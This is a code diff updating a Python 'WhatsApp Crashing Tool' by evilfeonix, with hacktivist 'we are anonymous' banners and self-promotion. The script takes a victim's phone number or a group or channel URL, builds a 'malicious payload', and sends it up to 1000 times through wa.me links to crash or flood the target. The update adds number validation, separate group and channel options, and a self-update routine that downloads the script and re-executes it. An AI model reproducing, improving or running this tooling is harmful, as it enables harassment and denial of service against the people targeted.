@@ -1,9 +1,9 @@
-# Versoin: 2.1
+# Versoin: 1.2
 # Author: evilfeonix
 # Name: WhatsApp Crashing Tool
 # Website: www.evilfeonix.com 
 # Email: evilfeonix@gmail.com 
-# Date: 20 - NOVEMBER - 2024
+# Latest Update: 08 - FEBUARY - 2025
 
 
 ######   Welcoming to WhatsApp Crasher...
@@ -12,8 +12,6 @@
   
 import os, sys, time, urllib
 from socket import *
-import phonenumbers
-import requests
 import json
 
 ipaddr = gethostbyname(gethostname())
@@ -29,8 +27,6 @@ purple="\033[95;1m"
 def slow(F3):
     for a in F3 + '\n':sys.stdout.write(a),sys.stdout.flush(),time.sleep(1./300)
 
-
-
 def internet():
     try:
         s = socket(AF_NET, SOCK_STREAM)
@@ -39,13 +35,13 @@ def internet():
     except Exception:return False
 
 def aboutus():
-    slow("    Tool Name: Whats Crash")
-    slow("    Version: v[1.1]")
-    slow("    Author: evilfeonix")
-    slow("    Github: Digital Firebird")
-    slow("    Youtube: Digital Firebird")
-    slow("    Update: 28 - JAN - 2025")
-    slow(f"==========================================================={white}")
+    slow("    Tool Name      :   Whats Crash")
+    slow("    Version        :   v[1.2]")
+    slow("    Author         :   evilfeonix")
+    slow("    Github         :   Digital Firebird")
+    slow("    Youtube        :   Digital Firebird")
+    slow("    Latest Update  :   08 - FEB - 2025")
+    slow(f"==========================================================={white}\n")
 
 
 def banner():
@@ -57,6 +53,16 @@ def banner():
 | |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
 \___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
 ===========================================================""")
+
+
+try:
+    import phonenumbers, requests
+except:
+    banner()
+    slow(f"""[!] Run The Command Below: 
+    pip install requests phonenumbers
+[!] And Finally, Run This Script:
+    python3 {sys.argv[0]}\n{white}""")
 
 
 def set_malicious_payload(user):
@@ -208,6 +214,55 @@ def set_malicious_payload(user):
     ======================================================================================"""
 
     return data
+
+
+import os
+import subprocess
+import sys
+import urllib.request
+import hashlib
+
+def get_remote_hash(url):
+    try:
+        response = urllib.request.urlopen(url)
+        data = response.read()
+        return hashlib.md5(data).hexdigest()
+    except Exception as e:
+        print(f"Error fetching remote script: {e}")
+        return None
+
+def get_local_hash(script_path):
+    try:
+        with open(script_path, 'rb') as f:
+            data = f.read()
+            return hashlib.md5(data).hexdigest()
+    except Exception as e:
+        print(f"Error reading local script: {e}")
+        return None
+
+def updateus(): 
+    try:
+        script_url = "https://github.com/evilfeonix/Whats-Crash/raw/main/crasher.py"
+        script_path = os.path.abspath(__file__)
+        
+        remote_hash = get_remote_hash(script_url)
+        local_hash = get_local_hash(script_path)
+        
+        if remote_hash and local_hash and remote_hash == local_hash:
+            print("No update available.")
+            return
+        
+        # Download the latest script
+        print("Downloading latest script...")
+        urllib.request.urlretrieve(script_url, script_path)
+        
+        # Restart the script
+        print("Restarting script...")
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+    except Exception as e:
+        print(f"Error updating script: {e}")
+
+
 def notFound(url):
     os.system('clear || cls')
     slow(f"""{red}
@@ -227,20 +282,23 @@ def notFound(url):
     Status: Server Not Found        
     Status_Code: 404        
     Message: 
-       If you're about to crash Whatsapp User/Group/Channel
-        ==>  The User/Group/Channel is Currently not Active         
-        ==>  Try Whatsapp User that using Whatsapp Business 
+       If you're about to crash Whatsapp Group/Channel
+        ==>  The Group/Channel is Currently not Active         
+        ==>  Or The Group/Channel URL is not Correct         
 
     Follow Us on Github
-    Star and Fork our Repositories       
+    Fork our Repositories  
+    Give our Repositories a Star
+    Contribute to our Repositories  
+    Contact us at evilfeonix@gmail.com 
+
            [+] Subscribe To Our YouTube Channel [+]
-==========================================================={white}
-            """)
-    input(f"{red}Press [ENTER] to Continue{red}") 
+==========================================================={white}""")
+    input(f"{red}Press [ENTER] to Continue...{white}") 
     evilfeonix="https://github.com/evilfeonix" 
     os.system(f"xdg-open {evilfeonix}")
     os.sys.exit()
-
+ 
 def start_attack(msg,victim):
     payload = set_malicious_payload(msg)
 
@@ -248,20 +306,31 @@ def start_attack(msg,victim):
 
     if victim[0] == '+':
         data = urllib.parse.urlencode(worm)
-        url = f"https://wa.me/{victim}?{data}"
+        from phonenumbers import is_valid_number
+        try: 
+            phoneNumber = phonenumbers.parse(victim)
+        except Exception as e:
+            slow(f"\nError While Parsing Phone Number: {e}{white}\n")
+            os.sys.exit()
+        if is_valid_number(phoneNumber):
+            pass
+        else:
+            slow(f"\nInvalid Phone Number.{white}\n")
+            os.sys.exit()
+        victim=phonenumbers.format_number(phoneNumber,phonenumbers.PhoneNumberFormat.E164)
+        url = f"https://wa.me/{victim[1:]}?{data}"
 
     else:
         data = urllib.parse.urlencode(worm)
         url = f"{victim}?{data}"
-    
-    
+
     try:response = requests.get(url)
     
     except requests.exceptions.ConnectionError:
-        slow(f"{red}[-] Please Check Your Internet Connection.{white}")
+        slow(f"{red}[-] Please Check Your Internet Connection.{white}\n")
         os.sys.exit()
     except requests.exceptions.ReadTimeout as a:
-        slow(f"{red}[-] Read timed out: Seems Like You're Out Of Data.{white}")
+        slow(f"{red}[-] Read timed out: Seems Like You're Out Of Data.{white}\n")
         os.sys.exit()
 
 
@@ -280,7 +349,7 @@ def multipro(victim):
     msg = input("[+] Enter message to send: ")
     os.system("clear || cls")
     try:
-        slow(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}")
+        slow(f"""{bg}{red}Press Ctrl+C to Stop Attacks\033[0m""")
         for k in range(1000):
             a,c = start_attack(msg,victim)
             if a == True:
@@ -288,49 +357,14 @@ def multipro(victim):
             else:
                 j+=1
             time.sleep(0.1)
+            print(f"{red}\t==> [{i}]",end="\r")
 
     except KeyboardInterrupt:
-        slow(f"{red}[-] Attack Stopped!{white}              ")
+        slow(f"\n{red}[-] Attack At Down!{white}              \n")
         time.sleep(3)
 
     os.system('clear || cls')
     slow(f"""{red}
- _      _  _           _           ____               _     
-| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
-| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
-| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | | 
-\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
-===========================================================
-    HAHAHA!. 💀☠💀               
-    we are 🎭 anonymous 🤬,   
-    we do not forgive 👿,  
-    we do not forget 😈,
-    expect us 👥 any time 👀.{red}
-===========================================================
-    Status: OK        
-    Status_Code: 200        
-    Victim: {victim}        
-    Sent: {i}        
-    Failed: {j}        
-
-    Follow Us on Github
-    Star and Fork our Repositories       
-           [+] Subscribe To Our YouTube Channel [+]
-==========================================================={white}
-            """)
-    input(f"{red}Press [ENTER] to Continue{red}") 
-    evilfeonix="https://github.com/evilfeonix" 
-    os.system(f"xdg-open {evilfeonix}")
-
-def pro(victim):
-    i=0
-    j=0
-    k=0
-    msg = input("[+] Enter message to send: ")
-    a,c = start_attack(msg,victim)
-    if a == True:
-        i+=1
-        slow(f"""{red}
  _      _  _           _           ____               _     
 | |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
 | | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
@@ -350,53 +384,28 @@ def pro(victim):
     Failed: {j}        
 
     Follow Us on Github
-    Star and Fork our Repositories       
-           [+] Subscribe To Our YouTube Channel [+]
-==========================================================={white}
-            """)
-        input(f"{red}Press [ENTER] to Continue{red}") 
-        evilfeonix="https://github.com/evilfeonix" 
-        os.system(f"xdg-open {evilfeonix}")
+    Fork our Repositories  
+    Give our Repositories a Star
+    Contribute to our Repositories  
+    Contact us at evilfeonix@gmail.com 
 
-    else:
-        j+=1
-        slow(f"""{red}
- _      _  _           _           ____               _     
-| |    | || |__   __ _| |_ ___    / ___|_ __ __ _ ___| |__  
-| | /\ | || '_ \ / _` | __/ __|  | |   | '__/ _` / __| '_ \ 
-| |/  \| || | | | (_| | |_\__ \  | |___| | | (_| \__ \ | | |
-\___/\___/|_| |_|\__,_|\__|___/   \____|_|  \__,_|___/_| |_|
-===========================================================
-    HAHAHA!. 💀☠💀               
-    we are 🎭 anonymous 🤬,   
-    we do not forgive 👿,  
-    we do not forget 😈,
-    expect us 👥 any time 👀.{red}
-===========================================================
-    Status: An error occure       
-    Status_Code: {c}      
-    Victim: {victim}        
-    Sent: {i}        
-    Failed: {j}        
-
-    Follow Us on Github
-    Star and Fork our Repositories       
            [+] Subscribe To Our YouTube Channel [+]
-==========================================================={white}
-            """)
-        input(f"{red}Press [ENTER] to Continue{red}") 
-        evilfeonix="https://github.com/evilfeonix" 
-        os.system(f"xdg-open {evilfeonix}")
-    
+==========================================================={white}""")
+    input(f"{red}Press [ENTER] to Continue...{white}") 
+    evilfeonix="https://github.com/evilfeonix" 
+    os.system(f"xdg-open {evilfeonix}")
+    os.sys.exit()
+
+
 def main():
     banner()
-    slow("    HAHAHA!.               ")
-    slow("    we are 🎭 anonymous,   ")
-    slow("    we represent freedom,  ")
-    slow("    we oppose oppression,  ")
-    slow("    we are simply an evolution 🧬 of the technology system 👨🏾‍💻, ")
-    slow("    where liberty 🗽 is at risk, ")
-    slow("    expect us 👥.               ")
+    slow("    HAHAHA")
+    slow("    we are anonymous 🎭")
+    slow("    we represent freedom")
+    slow("    we oppossed oppression")
+    slow("    we are simply an evolution 🧬 of the system technology")
+    slow("    were liberty is at risk")
+    slow("    expect us")
     slow("===========================================================")
     input("Press Enter to Continue...")
 
@@ -412,46 +421,68 @@ def main():
 
     banner()
     slow("                         ")
-    slow("    [01] Exit This Tool ")
-    slow("    [02] About This Tool ")
+    slow("    [00] Exit This Tool ")
+    slow("    [01] About This Tool ")
+    slow("    [02] Update This Tool ")
     slow("    [03] Crash WhatsApp User ")
-    slow("    [04] Crash WhatsApp Group/Channel ")
-    slow("    [05] Send Red Flag to WhatsApp User ")
-    slow("    [06] Send Red Flag to WhatsApp Group/Channel ")
+    slow("    [04] Crash WhatsApp Group ")
+    slow("    [05] Crash WhatsApp Channel ")
     ec = input("    \n[Enter Choice]>> ")
 
-    if ec in ['01','1']:
-        slow('[-] Thanks for using this tool\nFollow us on github for more...')
+    if ec in ['00','0']:
+        banner()
+        slow(f'[-] Thanks for Using our WhatsApp Crashing Tool')
+        slow(f"""
+    Follow Us on Github
+    Fork our Repositories  
+    Give our Repositories a Star
+    Contribute to our Repositories  
+    Contact us at evilfeonix@gmail.com 
+
+           [+] Subscribe To Our YouTube Channel [+]
+==========================================================={white}""")
+        input(f"{red}Press [ENTER] to Continue{white}\n") 
+        evilfeonix="https://github.com/evilfeonix" 
+        os.system(f"xdg-open {evilfeonix}")
+        os.sys.exit()
+    elif ec in ['01','1']:
+        banner()
+        aboutus()
     elif ec in ['02','2']:
         os.system("clear || cls")
         banner()
-        aboutus()
+        updateus()
     elif ec in ['03','3']:
         os.system("clear || cls")
         banner()
         cncode = input('[+] Enter Victims Country Code withOut "+" eg.234: ')
         number = input("[+] Enter Victims Phone Number: ")
+        if cncode.strip() == "" or number.strip() == "":
+            slow("[!] Country Code or Phone Number Can't be Empty!")
+            slow(f"[!] Please Make Sure You Provide Them.{white}\n")
+            os.sys.exit()
         num = f"+{cncode}{number}"
         multipro(num)
     elif ec in ['04','4']:
         os.system("clear || cls")
         banner()
-        url = input('[+] Copy and Paste Group/Channel URL Here: ')
+        url = input('[+] Copy and Paste WhatsApp Group URL Here: ')
+        if url.strip() == "":
+            slow("[!] WhatsApp Group URL Can't be Empty!")
+            slow(f"[!] Please Make Sure You Provide It.{white}\n")
+            os.sys.exit()
         multipro(url)
     elif ec in ['05','5']:
         os.system("clear || cls")
         banner()
-        cncode = input('[+] Enter Victims Country Code withOut "+" eg.234: ')
-        number = input("[+] Enter Victims Phone Number: ")
-        num = f"+{cncode}{number}"
-        pro(num)
-    elif ec in ['06','6']:
-        os.system("clear || cls")
-        banner()
-        url = input('[+] Copy and Paste Group/Channel URL Here : ')
-        pro(url)
+        url = input('[+] Copy and Paste WhatsApp Channel URL Here: ')
+        if url.strip() == "":
+            slow("[!] WhatsApp Channel URL Can't be Empty!")
+            slow(f"[!] Please Make Sure You Provide It.{white}\n")
+            os.sys.exit()
+        multipro(url)
     else:
-        slow('[-] Invalid Choice...')
+        slow(f'[-] Invalid Choice...{white}\n')
         os.sys.exit()
     
     
